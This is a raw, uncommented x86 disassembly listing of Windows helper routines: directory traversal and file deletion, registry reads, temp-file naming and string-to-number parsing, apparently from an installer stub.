  406f92:	e9 d9 01 00 00       	jmp    0x407170
  406f97:	55                   	push   %ebp
  406f98:	8b eb                	mov    %ebx,%ebp
  406f9a:	83 e5 01             	and    $0x1,%ebp
  406f9d:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  406fa1:	74 11                	je     0x406fb4
  406fa3:	85 c0                	test   %eax,%eax
  406fa5:	0f 84 50 01 00 00    	je     0x4070fb
  406fab:	f6 c3 02             	test   $0x2,%bl
  406fae:	0f 84 4f 01 00 00    	je     0x407103
  406fb4:	56                   	push   %esi
  406fb5:	68 c0 1d 46 00       	push   $0x461dc0
  406fba:	e8 f1 03 00 00       	call   0x4073b0
  406fbf:	85 ed                	test   %ebp,%ebp
  406fc1:	8b 2d 6c 91 40 00    	mov    0x40916c,%ebp
  406fc7:	74 0e                	je     0x406fd7
  406fc9:	68 10 a7 40 00       	push   $0x40a710
  406fce:	68 c0 1d 46 00       	push   $0x461dc0
  406fd3:	ff d5                	call   *%ebp
  406fd5:	eb 06                	jmp    0x406fdd
  406fd7:	56                   	push   %esi
  406fd8:	e8 c9 05 00 00       	call   0x4075a6
  406fdd:	33 c0                	xor    %eax,%eax
  406fdf:	66 39 06             	cmp    %ax,(%esi)
  406fe2:	75 0a                	jne    0x406fee
  406fe4:	66 83 3d c0 1d 46 00 	cmpw   $0x5c,0x461dc0
  406feb:	5c 
  406fec:	75 08                	jne    0x406ff6
  406fee:	68 ac 9a 40 00       	push   $0x409aac
  406ff3:	56                   	push   %esi
  406ff4:	ff d5                	call   *%ebp
  406ff6:	56                   	push   %esi
  406ff7:	ff 15 8c 90 40 00    	call   *0x40908c
  406ffd:	8d 04 46             	lea    (%esi,%eax,2),%eax
  407000:	89 44 24 10          	mov    %eax,0x10(%esp)
  407004:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  407008:	50                   	push   %eax
  407009:	68 c0 1d 46 00       	push   $0x461dc0
  40700e:	ff 15 34 91 40 00    	call   *0x409134
  407014:	8b e8                	mov    %eax,%ebp
  407016:	83 fd ff             	cmp    $0xffffffff,%ebp
  407019:	0f 84 c1 00 00 00    	je     0x4070e0
  40701f:	6a 2e                	push   $0x2e
  407021:	58                   	pop    %eax
  407022:	66 39 44 24 48       	cmp    %ax,0x48(%esp)
  407027:	75 1b                	jne    0x407044
  407029:	66 83 7c 24 4a 00    	cmpw   $0x0,0x4a(%esp)
  40702f:	0f 84 8d 00 00 00    	je     0x4070c2
  407035:	66 39 44 24 4a       	cmp    %ax,0x4a(%esp)
  40703a:	75 08                	jne    0x407044
  40703c:	66 83 7c 24 4c 00    	cmpw   $0x0,0x4c(%esp)
  407042:	74 7e                	je     0x4070c2
  407044:	8d 44 24 48          	lea    0x48(%esp),%eax
  407048:	50                   	push   %eax
  407049:	ff 74 24 14          	push   0x14(%esp)
  40704d:	e8 5e 03 00 00       	call   0x4073b0
  407052:	f6 44 24 1c 10       	testb  $0x10,0x1c(%esp)
  407057:	74 12                	je     0x40706b
  407059:	8b c3                	mov    %ebx,%eax
  40705b:	83 e0 03             	and    $0x3,%eax
  40705e:	3c 03                	cmp    $0x3,%al
  407060:	75 60                	jne    0x4070c2
  407062:	53                   	push   %ebx
  407063:	56                   	push   %esi
  407064:	e8 ec fe ff ff       	call   0x406f55
  407069:	eb 57                	jmp    0x4070c2
  40706b:	56                   	push   %esi
  40706c:	68 1c a7 40 00       	push   $0x40a71c
  407071:	e8 ae fd ff ff       	call   0x406e24
  407076:	59                   	pop    %ecx
  407077:	59                   	pop    %ecx
  407078:	57                   	push   %edi
  407079:	56                   	push   %esi
  40707a:	e8 74 fc ff ff       	call   0x406cf3
  40707f:	56                   	push   %esi
  407080:	85 c0                	test   %eax,%eax
  407082:	75 37                	jne    0x4070bb
  407084:	85 ff                	test   %edi,%edi
  407086:	74 1f                	je     0x4070a7
  407088:	68 50 a7 40 00       	push   $0x40a750
  40708d:	e8 92 fd ff ff       	call   0x406e24
  407092:	59                   	pop    %ecx
  407093:	59                   	pop    %ecx
  407094:	56                   	push   %esi
  407095:	6a f1                	push   $0xfffffff1
  407097:	e8 75 f2 ff ff       	call   0x406311
  40709c:	33 c0                	xor    %eax,%eax
  40709e:	50                   	push   %eax
  40709f:	56                   	push   %esi
  4070a0:	e8 6e f7 ff ff       	call   0x406813
  4070a5:	eb 1b                	jmp    0x4070c2
  4070a7:	68 98 a7 40 00       	push   $0x40a798
  4070ac:	e8 73 fd ff ff       	call   0x406e24
  4070b1:	ff 05 e8 e2 47 00    	incl   0x47e2e8
  4070b7:	59                   	pop    %ecx
  4070b8:	59                   	pop    %ecx
  4070b9:	eb 07                	jmp    0x4070c2
  4070bb:	6a f2                	push   $0xfffffff2
  4070bd:	e8 4f f2 ff ff       	call   0x406311
  4070c2:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4070c6:	50                   	push   %eax
  4070c7:	55                   	push   %ebp
  4070c8:	ff 15 30 91 40 00    	call   *0x409130
  4070ce:	6a 2e                	push   $0x2e
  4070d0:	85 c0                	test   %eax,%eax
  4070d2:	58                   	pop    %eax
  4070d3:	0f 85 49 ff ff ff    	jne    0x407022
  4070d9:	55                   	push   %ebp
  4070da:	ff 15 38 91 40 00    	call   *0x409138
  4070e0:	83 7c 24 14 00       	cmpl   $0x0,0x14(%esp)
  4070e5:	0f 84 84 00 00 00    	je     0x40716f
  4070eb:	8b 44 24 10          	mov    0x10(%esp),%eax
  4070ef:	33 c9                	xor    %ecx,%ecx
  4070f1:	66 89 48 fe          	mov    %cx,-0x2(%eax)
  4070f5:	39 4c 24 18          	cmp    %ecx,0x18(%esp)
  4070f9:	75 08                	jne    0x407103
  4070fb:	56                   	push   %esi
  4070fc:	68 d8 a7 40 00       	push   $0x40a7d8
  407101:	eb 56                	jmp    0x407159
  407103:	56                   	push   %esi
  407104:	e8 34 fc ff ff       	call   0x406d3d
  407109:	85 c0                	test   %eax,%eax
  40710b:	74 62                	je     0x40716f
  40710d:	56                   	push   %esi
  40710e:	e8 b1 fb ff ff       	call   0x406cc4
  407113:	56                   	push   %esi
  407114:	68 30 a8 40 00       	push   $0x40a830
  407119:	e8 06 fd ff ff       	call   0x406e24
  40711e:	59                   	pop    %ecx
  40711f:	59                   	pop    %ecx
  407120:	8b c7                	mov    %edi,%eax
  407122:	83 c8 01             	or     $0x1,%eax
  407125:	50                   	push   %eax
  407126:	56                   	push   %esi
  407127:	e8 c7 fb ff ff       	call   0x406cf3
  40712c:	56                   	push   %esi
  40712d:	85 c0                	test   %eax,%eax
  40712f:	75 37                	jne    0x407168
  407131:	85 ff                	test   %edi,%edi
  407133:	74 1f                	je     0x407154
  407135:	68 70 a8 40 00       	push   $0x40a870
  40713a:	e8 e5 fc ff ff       	call   0x406e24
  40713f:	59                   	pop    %ecx
  407140:	59                   	pop    %ecx
  407141:	56                   	push   %esi
  407142:	6a f1                	push   $0xfffffff1
  407144:	e8 c8 f1 ff ff       	call   0x406311
  407149:	33 c0                	xor    %eax,%eax
  40714b:	50                   	push   %eax
  40714c:	56                   	push   %esi
  40714d:	e8 c1 f6 ff ff       	call   0x406813
  407152:	eb 1b                	jmp    0x40716f
  407154:	68 c0 a8 40 00       	push   $0x40a8c0
  407159:	e8 c6 fc ff ff       	call   0x406e24
  40715e:	ff 05 e8 e2 47 00    	incl   0x47e2e8
  407164:	59                   	pop    %ecx
  407165:	59                   	pop    %ecx
  407166:	eb 07                	jmp    0x40716f
  407168:	6a e5                	push   $0xffffffe5
  40716a:	e8 a2 f1 ff ff       	call   0x406311
  40716f:	5d                   	pop    %ebp
  407170:	5f                   	pop    %edi
  407171:	5e                   	pop    %esi
  407172:	5b                   	pop    %ebx
  407173:	81 c4 5c 02 00 00    	add    $0x25c,%esp
  407179:	c2 08 00             	ret    $0x8
  40717c:	56                   	push   %esi
  40717d:	57                   	push   %edi
  40717e:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  407182:	8b 34 fd 30 c0 40 00 	mov    0x40c030(,%edi,8),%esi
  407189:	56                   	push   %esi
  40718a:	ff 15 58 91 40 00    	call   *0x409158
  407190:	85 c0                	test   %eax,%eax
  407192:	75 0a                	jne    0x40719e
  407194:	56                   	push   %esi
  407195:	e8 da f5 ff ff       	call   0x406774
  40719a:	85 c0                	test   %eax,%eax
  40719c:	74 0e                	je     0x4071ac
  40719e:	ff 34 fd 34 c0 40 00 	push   0x40c034(,%edi,8)
  4071a5:	50                   	push   %eax
  4071a6:	ff 15 60 91 40 00    	call   *0x409160
  4071ac:	5f                   	pop    %edi
  4071ad:	5e                   	pop    %esi
  4071ae:	c2 04 00             	ret    $0x4
  4071b1:	ff 74 24 04          	push   0x4(%esp)
  4071b5:	ff 15 2c 91 40 00    	call   *0x40912c
  4071bb:	33 c9                	xor    %ecx,%ecx
  4071bd:	83 f8 ff             	cmp    $0xffffffff,%eax
  4071c0:	6a 00                	push   $0x0
  4071c2:	0f 44 c1             	cmove  %ecx,%eax
  4071c5:	50                   	push   %eax
  4071c6:	ff 74 24 14          	push   0x14(%esp)
  4071ca:	51                   	push   %ecx
  4071cb:	6a 01                	push   $0x1
  4071cd:	ff 74 24 1c          	push   0x1c(%esp)
  4071d1:	ff 74 24 1c          	push   0x1c(%esp)
  4071d5:	ff 15 80 90 40 00    	call   *0x409080
  4071db:	c2 0c 00             	ret    $0xc
  4071de:	55                   	push   %ebp
  4071df:	8b ec                	mov    %esp,%ebp
  4071e1:	51                   	push   %ecx
  4071e2:	56                   	push   %esi
  4071e3:	57                   	push   %edi
  4071e4:	8b 7d 10             	mov    0x10(%ebp),%edi
  4071e7:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4071ea:	33 f6                	xor    %esi,%esi
  4071ec:	56                   	push   %esi
  4071ed:	50                   	push   %eax
  4071ee:	57                   	push   %edi
  4071ef:	ff 75 0c             	push   0xc(%ebp)
  4071f2:	ff 75 08             	push   0x8(%ebp)
  4071f5:	ff 15 20 91 40 00    	call   *0x409120
  4071fb:	85 c0                	test   %eax,%eax
  4071fd:	74 06                	je     0x407205
  4071ff:	3b 7d fc             	cmp    -0x4(%ebp),%edi
  407202:	75 01                	jne    0x407205
  407204:	46                   	inc    %esi
  407205:	5f                   	pop    %edi
  407206:	8b c6                	mov    %esi,%eax
  407208:	5e                   	pop    %esi
  407209:	c9                   	leave
  40720a:	c2 0c 00             	ret    $0xc
  40720d:	55                   	push   %ebp
  40720e:	8b ec                	mov    %esp,%ebp
  407210:	51                   	push   %ecx
  407211:	51                   	push   %ecx
  407212:	57                   	push   %edi
  407213:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407216:	c7 45 f8 00 40 00 00 	movl   $0x4000,-0x8(%ebp)
  40721d:	50                   	push   %eax
  40721e:	8b 45 18             	mov    0x18(%ebp),%eax
  407221:	f7 d8                	neg    %eax
  407223:	1b c0                	sbb    %eax,%eax
  407225:	25 00 01 00 00       	and    $0x100,%eax
  40722a:	0d 19 00 02 00       	or     $0x20019,%eax
  40722f:	50                   	push   %eax
  407230:	ff 75 0c             	push   0xc(%ebp)
  407233:	ff 75 08             	push   0x8(%ebp)
  407236:	e8 73 f6 ff ff       	call   0x4068ae
  40723b:	8b 7d 14             	mov    0x14(%ebp),%edi
  40723e:	85 c0                	test   %eax,%eax
  407240:	75 3d                	jne    0x40727f
  407242:	56                   	push   %esi
  407243:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407246:	50                   	push   %eax
  407247:	57                   	push   %edi
  407248:	8d 45 18             	lea    0x18(%ebp),%eax
  40724b:	50                   	push   %eax
  40724c:	6a 00                	push   $0x0
  40724e:	ff 75 10             	push   0x10(%ebp)
  407251:	ff 75 fc             	push   -0x4(%ebp)
  407254:	ff 15 14 90 40 00    	call   *0x409014
  40725a:	ff 75 fc             	push   -0x4(%ebp)
  40725d:	8b f0                	mov    %eax,%esi
  40725f:	ff 15 00 90 40 00    	call   *0x409000
  407265:	33 c0                	xor    %eax,%eax
  407267:	85 f6                	test   %esi,%esi
  407269:	66 89 87 fe 3f 00 00 	mov    %ax,0x3ffe(%edi)
  407270:	5e                   	pop    %esi
  407271:	75 0c                	jne    0x40727f
  407273:	83 7d 18 01          	cmpl   $0x1,0x18(%ebp)
  407277:	74 0b                	je     0x407284
  407279:	83 7d 18 02          	cmpl   $0x2,0x18(%ebp)
  40727d:	74 05                	je     0x407284
  40727f:	33 c0                	xor    %eax,%eax
  407281:	66 89 07             	mov    %ax,(%edi)
  407284:	5f                   	pop    %edi
  407285:	c9                   	leave
  407286:	c2 14 00             	ret    $0x14
  407289:	8b 44 24 04          	mov    0x4(%esp),%eax
  40728d:	50                   	push   %eax
  40728e:	83 60 24 00          	andl   $0x0,0x24(%eax)
  407292:	c7 00 3c 00 00 00    	movl   $0x3c,(%eax)
  407298:	ff 15 78 91 40 00    	call   *0x409178
  40729e:	c2 04 00             	ret    $0x4
  4072a1:	55                   	push   %ebp
  4072a2:	8b ec                	mov    %esp,%ebp
  4072a4:	51                   	push   %ecx
  4072a5:	56                   	push   %esi
  4072a6:	57                   	push   %edi
  4072a7:	8b 7d 10             	mov    0x10(%ebp),%edi
  4072aa:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4072ad:	33 f6                	xor    %esi,%esi
  4072af:	56                   	push   %esi
  4072b0:	50                   	push   %eax
  4072b1:	57                   	push   %edi
  4072b2:	ff 75 0c             	push   0xc(%ebp)
  4072b5:	ff 75 08             	push   0x8(%ebp)
  4072b8:	ff 15 74 90 40 00    	call   *0x409074
  4072be:	85 c0                	test   %eax,%eax
  4072c0:	74 06                	je     0x4072c8
  4072c2:	3b 7d fc             	cmp    -0x4(%ebp),%edi
  4072c5:	75 01                	jne    0x4072c8
  4072c7:	46                   	inc    %esi
  4072c8:	5f                   	pop    %edi
  4072c9:	8b c6                	mov    %esi,%eax
  4072cb:	5e                   	pop    %esi
  4072cc:	c9                   	leave
  4072cd:	c2 0c 00             	ret    $0xc
  4072d0:	68 00 20 00 00       	push   $0x2000
  4072d5:	ff 74 24 0c          	push   0xc(%esp)
  4072d9:	ff 74 24 0c          	push   0xc(%esp)
  4072dd:	ff 35 fc 61 47 00    	push   0x4761fc
  4072e3:	ff 15 90 92 40 00    	call   *0x409290
  4072e9:	c2 08 00             	ret    $0x8
  4072ec:	55                   	push   %ebp
  4072ed:	8b ec                	mov    %esp,%ebp
  4072ef:	51                   	push   %ecx
  4072f0:	51                   	push   %ecx
  4072f1:	56                   	push   %esi
  4072f2:	8b 75 08             	mov    0x8(%ebp),%esi
  4072f5:	57                   	push   %edi
  4072f6:	6a 64                	push   $0x64
  4072f8:	5f                   	pop    %edi
  4072f9:	4f                   	dec    %edi
  4072fa:	c7 45 f8 6e 00 73 00 	movl   $0x73006e,-0x8(%ebp)
  407301:	c7 45 fc 61 00 00 00 	movl   $0x61,-0x4(%ebp)
  407308:	ff 15 cc 90 40 00    	call   *0x4090cc
  40730e:	6a 1a                	push   $0x1a
  407310:	59                   	pop    %ecx
  407311:	33 d2                	xor    %edx,%edx
  407313:	f7 f1                	div    %ecx
  407315:	56                   	push   %esi
  407316:	66 01 55 fc          	add    %dx,-0x4(%ebp)
  40731a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40731d:	6a 00                	push   $0x0
  40731f:	50                   	push   %eax
  407320:	ff 75 0c             	push   0xc(%ebp)
  407323:	ff 15 50 91 40 00    	call   *0x409150
  407329:	85 c0                	test   %eax,%eax
  40732b:	75 09                	jne    0x407336
  40732d:	85 ff                	test   %edi,%edi
  40732f:	75 c8                	jne    0x4072f9
  407331:	66 89 06             	mov    %ax,(%esi)
  407334:	eb 02                	jmp    0x407338
  407336:	8b c6                	mov    %esi,%eax
  407338:	5f                   	pop    %edi
  407339:	5e                   	pop    %esi
  40733a:	c9                   	leave
  40733b:	c2 08 00             	ret    $0x8
  40733e:	8b 44 24 08          	mov    0x8(%esp),%eax
  407342:	8b c8                	mov    %eax,%ecx
  407344:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  40734a:	83 3d 00 e3 47 00 00 	cmpl   $0x0,0x47e300
  407351:	74 07                	je     0x40735a
  407353:	c1 e8 15             	shr    $0x15,%eax
  407356:	85 c0                	test   %eax,%eax
  407358:	75 47                	jne    0x4073a1
  40735a:	83 3d 08 e3 47 00 00 	cmpl   $0x0,0x47e308
  407361:	74 06                	je     0x407369
  407363:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  407369:	a1 18 62 47 00       	mov    0x476218,%eax
  40736e:	a3 9c c0 40 00       	mov    %eax,0x40c09c
  407373:	a1 14 62 47 00       	mov    0x476214,%eax
  407378:	a3 a0 c0 40 00       	mov    %eax,0x40c0a0
  40737d:	8b 44 24 04          	mov    0x4(%esp),%eax
  407381:	68 98 c0 40 00       	push   $0x40c098
  407386:	a3 a4 c0 40 00       	mov    %eax,0x40c0a4
  40738b:	c7 05 a8 c0 40 00 20 	movl   $0x476220,0x40c0a8
  407392:	62 47 00 
  407395:	89 0d ac c0 40 00    	mov    %ecx,0x40c0ac
  40739b:	ff 15 84 92 40 00    	call   *0x409284
  4073a1:	c2 08 00             	ret    $0x8
  4073a4:	ff 25 98 92 40 00    	jmp    *0x409298
  4073aa:	ff 25 6c 91 40 00    	jmp    *0x40916c
  4073b0:	68 00 20 00 00       	push   $0x2000
  4073b5:	ff 74 24 0c          	push   0xc(%esp)
  4073b9:	ff 74 24 0c          	push   0xc(%esp)
  4073bd:	ff 15 90 90 40 00    	call   *0x409090
  4073c3:	c2 08 00             	ret    $0x8
  4073c6:	ff 25 8c 90 40 00    	jmp    *0x40908c
  4073cc:	51                   	push   %ecx
  4073cd:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4073d1:	53                   	push   %ebx
  4073d2:	55                   	push   %ebp
  4073d3:	8b 2d e4 90 40 00    	mov    0x4090e4,%ebp
  4073d9:	56                   	push   %esi
  4073da:	57                   	push   %edi
  4073db:	50                   	push   %eax
  4073dc:	ff d5                	call   *%ebp
  4073de:	8b 74 24 18          	mov    0x18(%esp),%esi
  4073e2:	8b f8                	mov    %eax,%edi
  4073e4:	56                   	push   %esi
  4073e5:	ff d5                	call   *%ebp
  4073e7:	3b c7                	cmp    %edi,%eax
  4073e9:	7c 3a                	jl     0x407425
  4073eb:	8b 0d 64 91 40 00    	mov    0x409164,%ecx
  4073f1:	a1 8c 92 40 00       	mov    0x40928c,%eax
  4073f6:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  4073fa:	89 44 24 18          	mov    %eax,0x18(%esp)
  4073fe:	ff 74 24 1c          	push   0x1c(%esp)
  407402:	8a 1c 37             	mov    (%edi,%esi,1),%bl
  407405:	56                   	push   %esi
  407406:	c6 04 37 00          	movb   $0x0,(%edi,%esi,1)
  40740a:	ff d1                	call   *%ecx
  40740c:	88 1c 37             	mov    %bl,(%edi,%esi,1)
  40740f:	85 c0                	test   %eax,%eax
  407411:	74 1c                	je     0x40742f
  407413:	56                   	push   %esi
  407414:	ff 54 24 1c          	call   *0x1c(%esp)
  407418:	8b f0                	mov    %eax,%esi
  40741a:	56                   	push   %esi
  40741b:	ff d5                	call   *%ebp
  40741d:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  407421:	3b c7                	cmp    %edi,%eax
  407423:	7d d9                	jge    0x4073fe
  407425:	33 c0                	xor    %eax,%eax
  407427:	5f                   	pop    %edi
  407428:	5e                   	pop    %esi
  407429:	5d                   	pop    %ebp
  40742a:	5b                   	pop    %ebx
  40742b:	59                   	pop    %ecx
  40742c:	c2 08 00             	ret    $0x8
  40742f:	8b c6                	mov    %esi,%eax
  407431:	eb f4                	jmp    0x407427
  407433:	56                   	push   %esi
  407434:	ff 74 24 08          	push   0x8(%esp)
  407438:	ff 15 2c 91 40 00    	call   *0x40912c
  40743e:	8b f0                	mov    %eax,%esi
  407440:	83 fe ff             	cmp    $0xffffffff,%esi
  407443:	74 10                	je     0x407455
  407445:	8b ce                	mov    %esi,%ecx
  407447:	83 e1 fe             	and    $0xfffffffe,%ecx
  40744a:	51                   	push   %ecx
  40744b:	ff 74 24 0c          	push   0xc(%esp)
  40744f:	ff 15 1c 91 40 00    	call   *0x40911c
  407455:	8b c6                	mov    %esi,%eax
  407457:	5e                   	pop    %esi
  407458:	c2 04 00             	ret    $0x4
  40745b:	53                   	push   %ebx
  40745c:	8b 1d 18 92 40 00    	mov    0x409218,%ebx
  407462:	55                   	push   %ebp
  407463:	56                   	push   %esi
  407464:	8b 74 24 10          	mov    0x10(%esp),%esi
  407468:	57                   	push   %edi
  407469:	56                   	push   %esi
  40746a:	ff d3                	call   *%ebx
  40746c:	8b f8                	mov    %eax,%edi
  40746e:	57                   	push   %edi
  40746f:	ff d3                	call   *%ebx
  407471:	0f b7 0e             	movzwl (%esi),%ecx
  407474:	66 85 c9             	test   %cx,%cx
  407477:	74 39                	je     0x4074b2
  407479:	66 83 3f 3a          	cmpw   $0x3a,(%edi)
  40747d:	6a 5c                	push   $0x5c
  40747f:	5d                   	pop    %ebp
  407480:	75 0b                	jne    0x40748d
  407482:	66 39 6f 02          	cmp    %bp,0x2(%edi)
  407486:	75 05                	jne    0x40748d
  407488:	50                   	push   %eax
  407489:	ff d3                	call   *%ebx
  40748b:	eb 27                	jmp    0x4074b4
  40748d:	66 3b cd             	cmp    %bp,%cx
  407490:	75 20                	jne    0x4074b2
  407492:	66 39 6e 02          	cmp    %bp,0x2(%esi)
  407496:	75 1a                	jne    0x4074b2
  407498:	6a 02                	push   $0x2
  40749a:	5e                   	pop    %esi
  40749b:	55                   	push   %ebp
  40749c:	50                   	push   %eax
  40749d:	4e                   	dec    %esi
  40749e:	e8 c1 f8 ff ff       	call   0x406d64
  4074a3:	66 83 38 00          	cmpw   $0x0,(%eax)
  4074a7:	74 09                	je     0x4074b2
  4074a9:	83 c0 02             	add    $0x2,%eax
  4074ac:	85 f6                	test   %esi,%esi
  4074ae:	75 eb                	jne    0x40749b
  4074b0:	eb 02                	jmp    0x4074b4
  4074b2:	33 c0                	xor    %eax,%eax
  4074b4:	5f                   	pop    %edi
  4074b5:	5e                   	pop    %esi
  4074b6:	5d                   	pop    %ebp
  4074b7:	5b                   	pop    %ebx
  4074b8:	c2 04 00             	ret    $0x4
  4074bb:	51                   	push   %ecx
  4074bc:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4074c0:	53                   	push   %ebx
  4074c1:	55                   	push   %ebp
  4074c2:	56                   	push   %esi
  4074c3:	0f b7 01             	movzwl (%ecx),%eax
  4074c6:	57                   	push   %edi
  4074c7:	6a 0a                	push   $0xa
  4074c9:	5b                   	pop    %ebx
  4074ca:	6a 39                	push   $0x39
  4074cc:	5d                   	pop    %ebp
  4074cd:	33 ff                	xor    %edi,%edi
  4074cf:	8b d0                	mov    %eax,%edx
  4074d1:	6a 2d                	push   $0x2d
  4074d3:	47                   	inc    %edi
  4074d4:	89 54 24 14          	mov    %edx,0x14(%esp)
  4074d8:	5e                   	pop    %esi
  4074d9:	89 7c 24 18          	mov    %edi,0x18(%esp)
  4074dd:	66 3b c6             	cmp    %si,%ax
  4074e0:	75 0b                	jne    0x4074ed
  4074e2:	0f b7 51 02          	movzwl 0x2(%ecx),%edx
  4074e6:	83 cf ff             	or     $0xffffffff,%edi
  4074e9:	89 7c 24 18          	mov    %edi,0x18(%esp)
  4074ed:	6a 2d                	push   $0x2d
  4074ef:	58                   	pop    %eax
  4074f0:	66 39 44 24 10       	cmp    %ax,0x10(%esp)
  4074f5:	8d 71 02             	lea    0x2(%ecx),%esi
  4074f8:	6a 30                	push   $0x30
  4074fa:	58                   	pop    %eax
  4074fb:	0f 45 f1             	cmovne %ecx,%esi
  4074fe:	66 3b d0             	cmp    %ax,%dx
  407501:	75 49                	jne    0x40754c
  407503:	83 c6 02             	add    $0x2,%esi
  407506:	6a 07                	push   $0x7
  407508:	5b                   	pop    %ebx
  407509:	0f b7 16             	movzwl (%esi),%edx
  40750c:	8d 42 d0             	lea    -0x30(%edx),%eax
  40750f:	0f b7 c8             	movzwl %ax,%ecx
  407512:	66 3b d9             	cmp    %cx,%bx
  407515:	1b c0                	sbb    %eax,%eax
  407517:	83 e0 02             	and    $0x2,%eax
  40751a:	83 c0 37             	add    $0x37,%eax
  40751d:	66 3b d9             	cmp    %cx,%bx
  407520:	0f b7 e8             	movzwl %ax,%ebp
  407523:	1b c0                	sbb    %eax,%eax
  407525:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  407529:	83 e0 02             	and    $0x2,%eax
  40752c:	0f b7 ed             	movzwl %bp,%ebp
  40752f:	83 c0 08             	add    $0x8,%eax
  407532:	0f b7 d8             	movzwl %ax,%ebx
  407535:	8b c2                	mov    %edx,%eax
  407537:	83 e0 df             	and    $0xffffffdf,%eax
  40753a:	83 f8 58             	cmp    $0x58,%eax
  40753d:	75 0d                	jne    0x40754c
  40753f:	8b 44 24 10          	mov    0x10(%esp),%eax
  407543:	83 c6 02             	add    $0x2,%esi
  407546:	6a 10                	push   $0x10
  407548:	5b                   	pop    %ebx
  407549:	0f b7 e8             	movzwl %ax,%ebp
  40754c:	0f b7 c5             	movzwl %bp,%eax
  40754f:	33 d2                	xor    %edx,%edx
  407551:	89 44 24 10          	mov    %eax,0x10(%esp)
  407555:	8b f8                	mov    %eax,%edi
  407557:	0f b7 06             	movzwl (%esi),%eax
  40755a:	8d 76 02             	lea    0x2(%esi),%esi
  40755d:	8b e8                	mov    %eax,%ebp
  40755f:	8b c8                	mov    %eax,%ecx
  407561:	6a 30                	push   $0x30
  407563:	58                   	pop    %eax
  407564:	66 3b e8             	cmp    %ax,%bp
  407567:	72 09                	jb     0x407572
  407569:	66 3b ef             	cmp    %di,%bp
  40756c:	77 04                	ja     0x407572
  40756e:	2b c8                	sub    %eax,%ecx
  407570:	eb 1b                	jmp    0x40758d
  407572:	6a 10                	push   $0x10
  407574:	58                   	pop    %eax
  407575:	66 3b d8             	cmp    %ax,%bx
  407578:	75 1d                	jne    0x407597
  40757a:	8b c1                	mov    %ecx,%eax
  40757c:	83 e0 df             	and    $0xffffffdf,%eax
  40757f:	83 e8 41             	sub    $0x41,%eax
  407582:	83 f8 05             	cmp    $0x5,%eax
  407585:	77 10                	ja     0x407597
  407587:	83 e1 07             	and    $0x7,%ecx
  40758a:	83 c1 09             	add    $0x9,%ecx
  40758d:	0f b7 c3             	movzwl %bx,%eax
  407590:	0f af d0             	imul   %eax,%edx
  407593:	03 d1                	add    %ecx,%edx
  407595:	eb c0                	jmp    0x407557
  407597:	8b 44 24 18          	mov    0x18(%esp),%eax
  40759b:	5f                   	pop    %edi
  40759c:	5e                   	pop    %esi
  40759d:	5d                   	pop    %ebp
  40759e:	0f af c2             	imul   %edx,%eax
  4075a1:	5b                   	pop    %ebx
  4075a2:	59                   	pop    %ecx
  4075a3:	c2 04 00             	ret    $0x4
  4075a6:	56                   	push   %esi
  4075a7:	8b 74 24 08          	mov    0x8(%esp),%esi
  4075ab:	56                   	push   %esi
  4075ac:	ff 15 8c 90 40 00    	call   *0x40908c
  4075b2:	8d 04 46             	lea    (%esi,%eax,2),%eax
  4075b5:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  4075b9:	74 0c                	je     0x4075c7
  4075bb:	50                   	push   %eax
  4075bc:	56                   	push   %esi
  4075bd:	ff 15 88 92 40 00    	call   *0x409288
  4075c3:	3b c6                	cmp    %esi,%eax
  4075c5:	77 ee                	ja     0x4075b5
  4075c7:	33 c9                	xor    %ecx,%ecx
  4075c9:	66 89 08             	mov    %cx,(%eax)
  4075cc:	83 c0 02             	add    $0x2,%eax
  4075cf:	5e                   	pop    %esi
  4075d0:	c2 04 00             	ret    $0x4
  4075d3:	53                   	push   %ebx
  4075d4:	55                   	push   %ebp
  4075d5:	56                   	push   %esi
  4075d6:	8b 74 24 10          	mov    0x10(%esp),%esi
  4075da:	57                   	push   %edi
  4075db:	6a 5c                	push   $0x5c
  4075dd:	5a                   	pop    %edx
  4075de:	0f b7 0e             	movzwl (%esi),%ecx
  4075e1:	8b c1                	mov    %ecx,%eax
  4075e3:	66 3b ca             	cmp    %dx,%cx
  4075e6:	75 19                	jne    0x407601
  4075e8:	66 39 56 02          	cmp    %dx,0x2(%esi)
  4075ec:	75 13                	jne    0x407601
  4075ee:	66 83 7e 04 3f       	cmpw   $0x3f,0x4(%esi)
  4075f3:	75 0c                	jne    0x407601
  4075f5:	66 39 56 06          	cmp    %dx,0x6(%esi)
  4075f9:	75 06                	jne    0x407601
  4075fb:	83 c6 08             	add    $0x8,%esi
  4075fe:	0f b7 06             	movzwl (%esi),%eax
  407601:	0f b7 d8             	movzwl %ax,%ebx
  407604:	66 85 c0             	test   %ax,%ax
  407607:	74 13                	je     0x40761c
  407609:	56                   	push   %esi
  40760a:	0f b7 d8             	movzwl %ax,%ebx
  40760d:	e8 85 00 00 00       	call   0x407697
  407612:	85 c0                	test   %eax,%eax
  407614:	74 06                	je     0x40761c
  407616:	83 c6 04             	add    $0x4,%esi
  407619:	0f b7 1e             	movzwl (%esi),%ebx
  40761c:	8b ee                	mov    %esi,%ebp
  40761e:	8b fe                	mov    %esi,%edi
  407620:	66 85 db             	test   %bx,%bx
  407623:	74 43                	je     0x407668
  407625:	0f b7 c3             	movzwl %bx,%eax
  407628:	8b 1d 18 92 40 00    	mov    0x409218,%ebx
  40762e:	66 83 f8 1f          	cmp    $0x1f,%ax
  407632:	76 25                	jbe    0x407659
  407634:	50                   	push   %eax
  407635:	68 24 a9 40 00       	push   $0x40a924
  40763a:	e8 25 f7 ff ff       	call   0x406d64
  40763f:	66 83 38 00          	cmpw   $0x0,(%eax)
  407643:	75 14                	jne    0x407659
  407645:	56                   	push   %esi
  407646:	ff d3                	call   *%ebx
  407648:	2b c6                	sub    %esi,%eax
